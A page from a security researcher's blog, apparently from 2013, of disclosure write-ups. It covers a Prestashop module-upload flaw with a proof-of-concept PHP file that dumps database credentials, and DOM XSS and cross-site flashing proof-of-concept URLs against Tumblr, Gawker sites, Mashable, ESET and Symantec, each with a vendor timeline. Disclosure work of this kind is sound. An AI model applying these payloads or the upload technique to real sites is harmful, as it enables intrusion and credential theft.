[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5885295676854449391&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5885295676854449391&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5885295676854449391&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5885295676854449391&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5885295676854449391&target=pinterest "Share to Pinterest")

Labels:
[google](http://davidsopaslabs.blogspot.com/search/label/google),
[google analytics](http://davidsopaslabs.blogspot.com/search/label/google%20analytics),
[google bots](http://davidsopaslabs.blogspot.com/search/label/google%20bots),
[proxy](http://davidsopaslabs.blogspot.com/search/label/proxy),
[sql injection](http://davidsopaslabs.blogspot.com/search/label/sql%20injection)

## Tuesday, October 29, 2013

### [How a salesman could hack Prestashop](http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html)

Continuing my work on analyzing [Prestashop](http://labs.davidsopas.com/search/label/prestashop) security, I found that low level employees profiles can hack [Prestashop](http://www.prestashop.com/) and possibly the server.

Prestashop (I tested under versions *1.5.4.1* and *1.5.5*) had employee default profiles that may use upload module option to get privilege information.

Logistician and salesman profile (with lower privileges than Admin and Superadmin) could use *AdminModules* to add a new module. This can be very tricky and dangerous because it doesn't require any validation in the file upload. Just zip/tar it and you have a successfully uploaded file into */modules/*.

Opening */controllers/admin/AdminModulesController.php* you can check that the validation on the module fails.

Take a deeper look into the code:
> protected function extractArchive($file, $redirect = true)
>
>  {
>
>  $zip\_folders = array();
>
>  $tmp\_folder = \_PS\_MODULE\_DIR\_.md5(time());
>
>  $success = false;
>
>  if (substr($file, -4) == '.zip')
>
>  {
>
>  if (Tools::ZipExtract($file, $tmp\_folder))
>
>  {
>
>  $zip\_folders = scandir($tmp\_folder);
>
>  if (Tools::ZipExtract($file, \_PS\_MODULE\_DIR\_))
>
>  $success = true;
>
>  }
>
>  }
>
>  else
>
>  {
>
>  $archive = new Archive\_Tar($file);
>
>  if ($archive->extract($tmp\_folder))
>
>  {
>
>  $zip\_folders = scandir($tmp\_folder);
>
>  if ($archive->extract(\_PS\_MODULE\_DIR\_))
>
>  $success = true;
>
>  }
>
>  }
>
>  if (!$success)
>
>  $this->errors[] = Tools::displayError('There was an error while extracting the module (file may be corrupted).');
>
>   //check if it's a real module
>
>  foreach($zip\_folders as $folder)
>
>  if (!in\_array($folder, array('.', '..', '.svn', '.git', '\_\_MACOSX')) && !Module::getInstanceByName($folder))
>
>  {
>
>  $this->errors[] = Tools::displayError('The \'.$folder.\' you uploaded is not a module');
>
>  $this->recursiveDeleteOnDisk(\_PS\_MODULE\_DIR\_.$folder);
>
>  }
>
>   @unlink($file);
>
>  $this->recursiveDeleteOnDisk($tmp\_folder);
>
>  if ($success && $redirect)
>
>  Tools::redirectAdmin(self::$currentIndex.'&conf=8&anchor=anchor'.ucfirst($folder).'&token='.$this->token);
>
>  return $success;
>
>  }

Notice that the file must be a zip or tar file. So far so good.

It also needs and checks for a folder. What if you don't have it? :-) It allows it and keeps the extracted file in /modules folder.

A compromise logistician, salesman or any other user that have permission to upload a module could upload a PHP shell or any other malicious file to obtain private information.

In my proof-of-concept, I used a default salesman profile account to upload a PHP file (*index2.php*) that contained a include to */config/settings.inc.php* and show me the database details.
> include('../config/settings.inc.php');
>
> echo "<h1>Prestashop file upload exploit (need at least logistian or vendor permissions)</h1>";
>
> echo "<h2>By David Sopas @dsopas - labs.davidsopas.com</h2>";
>
> echo "<h3>--------------------------------------------</h3>";
>
> echo "DB Server: " . \_DB\_SERVER\_ . "<br />";
>
> echo "DB Name: " . \_DB\_NAME\_ . "<br />";
>
> echo "DB User: " . \_DB\_USER\_ . "<br />";
>
> echo "DB Pass: " . \_DB\_PASSWD\_ . "<br />";
>
> echo "DB Prefix: " . \_DB\_PREFIX\_ . "<br />";

Check the screens to get a visual proof-of-concept.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhua3hQlhkjPUjOy5dyxIhqYlEQ3Q02ts25w9BOOaBORLkSi8R58gU1Hp8yZIy8MLO1YrXbBrAcGZgdzYDVYNWpQ86vWAoEefzhDKdjEzO87CjGyOgRFxNY3VeQ7ZaAPmHDYAWMIWhPAnty/s320/prestashop_step1.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhua3hQlhkjPUjOy5dyxIhqYlEQ3Q02ts25w9BOOaBORLkSi8R58gU1Hp8yZIy8MLO1YrXbBrAcGZgdzYDVYNWpQ86vWAoEefzhDKdjEzO87CjGyOgRFxNY3VeQ7ZaAPmHDYAWMIWhPAnty/s1600/prestashop_step1.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDt7tZ_Xn-dES7KwkdoONkDHepTGXrqQ3SYKTRHPsaJX6Fwe0p8JqdrQjq1Wq6arjoJtYeUpqmaXgNsG0NeHZ_H4DZEwPkrdjnb7gFmaAyq4x9XKPJyDedXo1AP-mzc6RuB9UTPADj4Cto/s320/prestashop_step2.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiDt7tZ_Xn-dES7KwkdoONkDHepTGXrqQ3SYKTRHPsaJX6Fwe0p8JqdrQjq1Wq6arjoJtYeUpqmaXgNsG0NeHZ_H4DZEwPkrdjnb7gFmaAyq4x9XKPJyDedXo1AP-mzc6RuB9UTPADj4Cto/s1600/prestashop_step2.jpg)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFiCPFCt86UezlySkMG9m2Xnwna0rbQEvvVkX8GqlPmD2fOJwjhJSV2tQlkkYOZg1yZEM4z1jhVe4J11sMiuTNBDSHjqP4atIuiGYrub7JXam-VxknFvRCrHOuQ6BAeFgI4vkcqePjDDgV/s320/prestashop_step3.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFiCPFCt86UezlySkMG9m2Xnwna0rbQEvvVkX8GqlPmD2fOJwjhJSV2tQlkkYOZg1yZEM4z1jhVe4J11sMiuTNBDSHjqP4atIuiGYrub7JXam-VxknFvRCrHOuQ6BAeFgI4vkcqePjDDgV/s1600/prestashop_step3.jpg)

You can even use the same method to add a SuperAdmin user and have all the privileges you need.

This also can be used to search for server vulnerabilities and gain root access (if the server is vulnerable). As you can see it's a open door for larger attacks.

Solutions?

* Moderation of lower privileges uploads (or even not allowing it)
* Testing if module is really... a module
* Heuristic analysis of malicious code

I contacted Prestashop and they told me that technically is not a easier thing to do. However they changed the right of their default profiles and deleted the right to add or delete modules (CVE-2013-6295).

Personally I advise all users that admin a Prestashop installation to remove the module permissions on users that don't need this feature, only allowing it on people that you would trust (if this can be possible :-) )

Timeline

07 Oct 2013: Contacted Prestashop security

07 Oct 2013: Prestashop replied telling me that they changed the right of their default profiles

07 Oct 2013: Asked a few more questions about patching - no reply

14 Oct 2013: Asked again about this issue - no reply

29 Oct 2013: Full disclosure

Posted by
David

at

[7:38 AM](http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html "permanent link")

[1 comment:](http://davidsopaslabs.blogspot.com/2013/10/how-salesman-could-hack-prestashop.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=818389931110385381&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=818389931110385381&target=pinterest "Share to Pinterest")

Labels:
[CVE-2013-6295](http://davidsopaslabs.blogspot.com/search/label/CVE-2013-6295),
[file upload](http://davidsopaslabs.blogspot.com/search/label/file%20upload),
[modules](http://davidsopaslabs.blogspot.com/search/label/modules),
[prestashop](http://davidsopaslabs.blogspot.com/search/label/prestashop)

## Tuesday, October 1, 2013

### [Wordpress, FBI and TOR, Kernel.org and DOM XSS](http://davidsopaslabs.blogspot.com/2013/10/wordpress-fbi-and-tor-kernelorg-and-dom.html)

Here what's worth reading during this week:

- Statistics Show Why WordPress is a Popular Hacker Target <http://www.wpwhitesecurity.com/wordpress-news/statistics-70-percent-wordpress-installations-vulnerable/>

- Analysis of the FBI Tor Malware <http://oweng.myweb.port.ac.uk/fbi-tor-malware-analysis/>

- Who rooted kernel.org servers two years ago, how did it happen, and why? <http://arstechnica.com/security/2013/09/who-rooted-kernel-org-servers-two-years-ago-how-did-it-happen-and-why/>

- 25 Million Flows Later - Large-scale Detection of DOM-based XSS <http://ben-stock.de/wp-content/uploads/domxss.pdf>

- Summary of our CCS paper on DOM-based XSS <http://ben-stock.de/2013/09/summary-of-our-ccs-paper-on-dom-based-xss/>

Feel free to suggest some new articles. Just tweet [@dsopas](https://www.twitter.com/dsopas).

Posted by
David

at

[4:17 AM](http://davidsopaslabs.blogspot.com/2013/10/wordpress-fbi-and-tor-kernelorg-and-dom.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/10/wordpress-fbi-and-tor-kernelorg-and-dom.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=6772885981396393948&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=6772885981396393948&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=6772885981396393948&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=6772885981396393948&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=6772885981396393948&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=6772885981396393948&target=pinterest "Share to Pinterest")

Labels:
[ccs](http://davidsopaslabs.blogspot.com/search/label/ccs),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[fbi](http://davidsopaslabs.blogspot.com/search/label/fbi),
[hacker](http://davidsopaslabs.blogspot.com/search/label/hacker),
[kernel](http://davidsopaslabs.blogspot.com/search/label/kernel),
[malware](http://davidsopaslabs.blogspot.com/search/label/malware),
[root](http://davidsopaslabs.blogspot.com/search/label/root),
[tor](http://davidsopaslabs.blogspot.com/search/label/tor),
[wordpress](http://davidsopaslabs.blogspot.com/search/label/wordpress)

## Tuesday, September 24, 2013

### [Tumblr got DOM XSSed](http://davidsopaslabs.blogspot.com/2013/09/tumblr-got-dom-xssed.html)

When using this [awesome blog platform](http://www.tumblr.com/) - which hosts more than 138,4 million blogs - I come across a vulnerability that could be used my malicious users to a variety of illegal activities (steal user credentials, spread malware, spamming, etc).

This vulnerability could put millions of web surfers at risk of malicious user attacks.

The affected file was located at <http://assets.tumblr.com/assets/scripts/tumblelog_iframe.js>.

A couple of variables (name and title) weren't properly sanitized within the source *location.hash*. So basically anyone could explore it by injecting HTML and launching a reflected [DOM XSS](http://labs.davidsopas.com/search/label/dom%20xss) attack - <https://www.owasp.org/index.php/DOM_Based_XSS>.

Vulnerable code:
> (...)
> if (v) {
> v.innerHTML = decodeURIComponent(e.get.name)
> }
> (...)
> document.getElementById("name").innerHTML = r;
> document.getElementById("title").innerHTML = decodeURIComponent(x).replace(/\+/g, " ");
> (...)

Proof-of-concept:
> http://assets.tumblr.com/assets/html/iframe/o.html?\_v=0e885d75acad691664be152f8a0af5b0#src=http%3A%2F%2Fstatus.soundcloud.com%2Fpost%2F55089207412%2Fmaintenance-tomorrow-morning&pid=55089207412&rk=Obe5imR3&lang=en\_US&name=soundcloudstatus%3Cimg%20src=x%20onerror=prompt%281%29;%3E&avatar=http%3A%2F%2F24.media.tumblr.com%2Favatar\_d06f17cd8eb4\_64.png&title=SoundCloud+Status&url=http%3A%2F%2Fstatus.soundcloud.com%2F&page\_slide=slide

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqofenzelQGqgcehlxXaCCvHVYyjB2wai2-XGwFJupC5lt2S4Z5PHCPfaMQetvLdY1jk-UeGFhNmi1nW0g_9Q06ud6TtEUXHC_OKTvYMZXqUlSb63tEpmSxN5sljnRnqs83GkbBf_V7oyE/s320/tumblr_xss.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqofenzelQGqgcehlxXaCCvHVYyjB2wai2-XGwFJupC5lt2S4Z5PHCPfaMQetvLdY1jk-UeGFhNmi1nW0g_9Q06ud6TtEUXHC_OKTvYMZXqUlSb63tEpmSxN5sljnRnqs83GkbBf_V7oyE/s1600/tumblr_xss.png)

You didn't even need to be authenticated in Tumblr.

Tumblr patched it by using a sanitize function in the Javascript file:
> (...)
> document.getElementById("name").innerHTML=\_t.sanitize(r,true);
> document.getElementById("title").innerHTML=\_t.sanitize(x,true).replace(/\+/g," ");
> (...)

It took more than two months to fix this reflected DOM XSS. And this isn't the first time that Tumblr *ignores* this kind of vulnerability. On June 25, 2012 the researcher Riyaz Walikar found and published a persistent XSS (<http://www.riyazwalikar.com/2012/07/stored-persistent-xss-on-tumblr.html>) that was only patched by Tumblr when it got public. They ignore his emails disclosing the vulnerability.

I really hope that in the future Tumblr patches this kind of security issues faster.

Timeline:

11 Jul 2013: Reported to Tumblr

11 Jul 2013: Tumblr reported that they're looking into it

17 Jul 2013: I asked for an update

17 Jul 2013: Tumblr reported again that they're looking into it

06 Aug 2013: I asked for other update

13 Aug 2013: Tumblr reported that they reviewed the exploit and were taking appropriate actions on their end

20 Set 2013: I noticed that the security issue was fixed and never got any reply.

24 Set 2013: Full disclosure

Posted by
David

at

[9:06 AM](http://davidsopaslabs.blogspot.com/2013/09/tumblr-got-dom-xssed.html "permanent link")

[2 comments:](http://davidsopaslabs.blogspot.com/2013/09/tumblr-got-dom-xssed.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=8387863619134296215&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8387863619134296215&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8387863619134296215&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8387863619134296215&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8387863619134296215&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8387863619134296215&target=pinterest "Share to Pinterest")

Labels:
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[tumblr](http://davidsopaslabs.blogspot.com/search/label/tumblr)

## Saturday, September 14, 2013

### [Your weekend reading about web security](http://davidsopaslabs.blogspot.com/2013/09/your-weekend-reading-about-web-security.html)

During this week I [tweeted](https://www.twitter.com/dsopas) this articles but I found interesting compiling it.

- Slow DoS on the Rise <https://blogs.akamai.com/2013/09/slow-dos-on-the-rise.html>

- Reducing Security <https://blog.whitehatsec.com/reducing-security/>

- Non-alphanumeric Backdoors <http://blog.sucuri.net/2013/09/ask-sucuri-non-alphanumeric-backdoors.html>

- Case Study: phpbb.com Compromised <http://blog.sucuri.net/2013/09/security-case-study-archive-phpbb-com.html>

- Pixel Perfect Timing Attacks with HTML5 <http://contextis.co.uk/files/Browser_Timing_Attacks.pdf>

- Mac OS X Security Configuration Guides <https://ssl.apple.com/support/security/guides/>

Feel free to suggest some new articles. Just tweet [@dsopas](https://www.twitter.com/dsopas).

Posted by
David

at

[12:14 AM](http://davidsopaslabs.blogspot.com/2013/09/your-weekend-reading-about-web-security.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/09/your-weekend-reading-about-web-security.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=7139422987709443973&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=7139422987709443973&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=7139422987709443973&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=7139422987709443973&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=7139422987709443973&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=7139422987709443973&target=pinterest "Share to Pinterest")

Labels:
[backdoors](http://davidsopaslabs.blogspot.com/search/label/backdoors),
[html5](http://davidsopaslabs.blogspot.com/search/label/html5),
[macosx](http://davidsopaslabs.blogspot.com/search/label/macosx),
[phpbb](http://davidsopaslabs.blogspot.com/search/label/phpbb),
[slow dos](http://davidsopaslabs.blogspot.com/search/label/slow%20dos),
[timing attacks](http://davidsopaslabs.blogspot.com/search/label/timing%20attacks),
[weekend reading](http://davidsopaslabs.blogspot.com/search/label/weekend%20reading)

## Friday, September 6, 2013

### [Gizmodo, Lifehacker, Gawker - reflected DOM XSS](http://davidsopaslabs.blogspot.com/2013/09/gizmodo-lifehacker-gawker-reflected-dom.html)

I'm a big follower of many of [Gawker Media](http://gawker.com/) websites - like [Lifehacker](http://lifehacker.com/) and [Gizmodo](http://gizmodo.com/) - and with that in mind I try to help them on their security level.

Just cruising along in Gizmodo website I found a problem that caught my attention.

A request to a file called *ad\_iframe.html* on *assets* directory. Checking the source code of that file I found:
> <script>
>
> var location\_parts = window.location.hash.substring(1).split('|');
>
> var rand = location\_parts[0];
>
> var scriptsrc = decodeURIComponent(location\_parts[1]);
>
> document.write("<scr"+"ipt src='" + scriptsrc + "'></scr"+"ipt>");
>
> </script>

The variable *scriptsrc* isn't properly escaped from the source *location.hash*.

Just giving the expected hashtag and pipe chars, a user could exploit this vulnerability with a [DOM XSS](http://labs.davidsopas.com/search/label/dom%20xss) to achieve information.

How can this be exploited?

Proof-of-concept on Gizmodo:
> http://gizmodo.com/assets/ad\_iframe.html#|'></script><script>alert("xss by @dsopas");</script><div x='

Proof-of-concept on Gizmodo (encoded):
> http://gizmodo.com/assets/ad\_iframe.html#|'>%3C%2F%73%63%72%69%70%74%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%78%73%73%20%62%79%20%40%64%73%6F%70%61%73%22%29%3B%3C%2F%73%63%72%69%70%74%3E%3C%64%69%76%20%78%3D%27

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyu9pEtzaFgfEIadZOApw-ikCYFBKl-o4CEcRJ_vxYX6s5k36JGRemX6Oz-_gJl3PuDhH63JZncXsZUCO8NaIxKmuP1vCB5Tkp8ylR7XCouNyUUtHHgDWW1wzXzuLxk7JYCt6rLUa5Ia9k/s320/gizmodo_xss.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyu9pEtzaFgfEIadZOApw-ikCYFBKl-o4CEcRJ_vxYX6s5k36JGRemX6Oz-_gJl3PuDhH63JZncXsZUCO8NaIxKmuP1vCB5Tkp8ylR7XCouNyUUtHHgDWW1wzXzuLxk7JYCt6rLUa5Ia9k/s1600/gizmodo_xss.jpg)

A malicious user could also:

* access other sites inside another client's private intranet.
* steal another client's cookie(s).
* modify another client's cookie(s).
* steal another client's submitted form data.
* modify another client's submitted form data (before it reaches the server).
* submit a form to your application on the user's behalf which modifies passwords or other application data

This DOM XSS vulnerability was present in many Gawker Media websites:
> http://gawker.com/assets/ad\_iframe.html
>
> http://gizmodo.com/assets/ad\_iframe.html
>
> http://lifehacker.com/assets/ad\_iframe.html
>
> http://deadspin.com/assets/ad\_iframe.html
>
> http://io9.com/assets/ad\_iframe.html
>
> http://jalopnik.com/assets/ad\_iframe.html
>
> http://jezebel.com/assets/ad\_iframe.html
>
> http://kotaku.com/assets/ad\_iframe.html

I want to thank Gawker Media tech team for fixing this issue in less than 24 hours. They really care about security and their users.

Timeline:

02 Set 2013: Reported to Gawker Media

03 Set 2013: Gawker Media replied that a fix has been deployed

06 Set 2013: Full disclosure

Posted by
David

at

[2:28 AM](http://davidsopaslabs.blogspot.com/2013/09/gizmodo-lifehacker-gawker-reflected-dom.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/09/gizmodo-lifehacker-gawker-reflected-dom.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=833490841877954341&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=833490841877954341&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=833490841877954341&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=833490841877954341&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=833490841877954341&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=833490841877954341&target=pinterest "Share to Pinterest")

Labels:
[ad\_iframe.html](http://davidsopaslabs.blogspot.com/search/label/ad_iframe.html),
[deadspin](http://davidsopaslabs.blogspot.com/search/label/deadspin),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[gawker](http://davidsopaslabs.blogspot.com/search/label/gawker),
[gizmodo](http://davidsopaslabs.blogspot.com/search/label/gizmodo),
[io9](http://davidsopaslabs.blogspot.com/search/label/io9),
[jalopnik](http://davidsopaslabs.blogspot.com/search/label/jalopnik),
[jezebel](http://davidsopaslabs.blogspot.com/search/label/jezebel),
[kotaku](http://davidsopaslabs.blogspot.com/search/label/kotaku),
[lifehacker](http://davidsopaslabs.blogspot.com/search/label/lifehacker)

## Tuesday, September 3, 2013

### [Mashable DOM XSS](http://davidsopaslabs.blogspot.com/2013/09/mashable-dom-xss.html)

Recently I found a security issue on [Mashable website](http://www.mashable.com/).

Vulnerable code was:
> (...)
> var customOpts = optsFromUrl(window.location.hash);
> (...)
> src = appendKeyVal(src, 'ord',      opts.options);
> (...)
> buffer += '<script class="ad\_call" src="' + src + '"><\/script>';
> (...)
> document.write(buffer);
> (...)

The source *location.hash* wasn't properly sanitized for injections and that way could be used to inject a [XSS](http://labs.davidsopas.com/search/label/xss) vector into the browser *DOM* by using the sink *document.write*.

Proof-of-concept:
> http://mashable.com/#type=left\_column&ord=499753815940197\_"><img src=x onerror=prompt(1);>&tile=1&sec0=home&sec1=index&escnotcategory=iframe&bg=#39ebd1&adnum=1

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9HWaKUfw119sfVe5FiHkkCnf6zbpT2kjn4zrzeCr4dVcacJdpH7JazjttXsroRB4qAQ7n6dtfYt7-qyJ3_kPkSPDkwEw_hl_VxYXgn8hr0kxBxnueqGC3bKr-sAGH1UIr8MOog4YL2P4M/s320/mashable_xss.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9HWaKUfw119sfVe5FiHkkCnf6zbpT2kjn4zrzeCr4dVcacJdpH7JazjttXsroRB4qAQ7n6dtfYt7-qyJ3_kPkSPDkwEw_hl_VxYXgn8hr0kxBxnueqGC3bKr-sAGH1UIr8MOog4YL2P4M/s1600/mashable_xss.jpg)

This type of attack could be used to trick innocent users, infecting them with malware and even get their accounts hijacked.

Timeline:

22 Ago 2013: Reported to Mashable

26 Ago 2013: Mashable replied that they will fix it

29 Ago 2013: Fix is released

03 Set 2013: Full disclosure

Posted by
David

at

[5:07 AM](http://davidsopaslabs.blogspot.com/2013/09/mashable-dom-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/09/mashable-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=8341787323052832792&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8341787323052832792&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8341787323052832792&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8341787323052832792&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8341787323052832792&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=8341787323052832792&target=pinterest "Share to Pinterest")

Labels:
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[mashable](http://davidsopaslabs.blogspot.com/search/label/mashable),
[xss](http://davidsopaslabs.blogspot.com/search/label/xss)

## Friday, August 16, 2013

### [ESET and Symantec victims of vulnerable JW Player](http://davidsopaslabs.blogspot.com/2013/08/eset-and-symantec-victims-of-vulnerable.html)

It seems that there are still many JW Players outdated in the wild.

I reported two security issues, same vulnerability that [I published about Yahoo](http://labs.davidsopas.com/2013/08/vulnerable-jw-player-on-two-yahoo-sites.html), on [ESET](http://www.eset.ro/) and [Symantec](http://www.symantec.com/) sites.

The problem is located under a vulnerable flash player ([JW Player](http://www.longtailvideo.com/jw-player/)) that can be used to explore a Cross site flashing - [OWASP-DV-004](https://www.owasp.org/index.php/Testing_for_Cross_site_flashing_%28OWASP-DV-004%29).

This may be used to trick innocent users to spread malware and even hijack accounts using the name of ESET and Symantec.

#1 Proof-of-concept on ESET:
> http://www.eset.ro/suport-antivirus/video-player/player.swf?playerready=alert("xss by @dsopas")

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9LpQXv6QUID1qEl1UYMxf5hyphenhyphenAeF3kp7MGvMKiV9J6LqfhKPZqQblG5KOs3hNSwpptAOK41iTrh72isbaSYv8APyInmY701Kwae93ZopGECnuzuCnpyLaqqJRm7ghP0N4x0ilPIXKye0qO/s320/eset_xss.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg9LpQXv6QUID1qEl1UYMxf5hyphenhyphenAeF3kp7MGvMKiV9J6LqfhKPZqQblG5KOs3hNSwpptAOK41iTrh72isbaSYv8APyInmY701Kwae93ZopGECnuzuCnpyLaqqJRm7ghP0N4x0ilPIXKye0qO/s1600/eset_xss.jpg)

#2 Proof-of-concept on Symantec:
> https://hp.symantec.com/sites/all/modules/contrib/jwplayermodule/player.swf?playerready=alert("xss by @dsopas");

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMvEoyfl64RSpxG3sN3P2WJOL-BwXsuaCmjLMjYhAm9GUQo2GFNe0IR26Mnmo7hX22KtpOntsNSyMYgi8t6xRYlkfyLtFuLwYI1IMKCGq_7my0XbEv1tzn-9z7xwM_KvmsmzeUBezw9tvQ/s320/symantec_xss.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMvEoyfl64RSpxG3sN3P2WJOL-BwXsuaCmjLMjYhAm9GUQo2GFNe0IR26Mnmo7hX22KtpOntsNSyMYgi8t6xRYlkfyLtFuLwYI1IMKCGq_7my0XbEv1tzn-9z7xwM_KvmsmzeUBezw9tvQ/s1600/symantec_xss.jpg)

Both issues were fixed (JW Player removed) by the vendors.

Timeline #1:

18 Jun 2013: Reported to ESET

03 Jul 2013: Fixed by ESET

16 Aug 2013: Full disclosure

Timeline #2:

19 Jun 2013: Reported to Symantec

20 Jun 2013: I noticed that the script was removed. Never got a reply back.

16 Aug 2013: Full disclosure

Posted by
David

at

[8:48 AM](http://davidsopaslabs.blogspot.com/2013/08/eset-and-symantec-victims-of-vulnerable.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/08/eset-and-symantec-victims-of-vulnerable.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=5838755474448465564&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5838755474448465564&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5838755474448465564&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5838755474448465564&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5838755474448465564&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5838755474448465564&target=pinterest "Share to Pinterest")

Labels:
[eset](http://davidsopaslabs.blogspot.com/search/label/eset),
[hp](http://davidsopaslabs.blogspot.com/search/label/hp),
[jwplayer](http://davidsopaslabs.blogspot.com/search/label/jwplayer),
[owasp-dv-004](http://davidsopaslabs.blogspot.com/search/label/owasp-dv-004),
[symantec](http://davidsopaslabs.blogspot.com/search/label/symantec)

## Tuesday, August 13, 2013

### [Vulnerable JW Player on two Yahoo sites](http://davidsopaslabs.blogspot.com/2013/08/vulnerable-jw-player-on-two-yahoo-sites.html)

Changeled by some web security analysts that told by that [Yahoo](http://www.yahoo.com/) is very hard to still find web vulnerabilities on their sites I found two flaws.

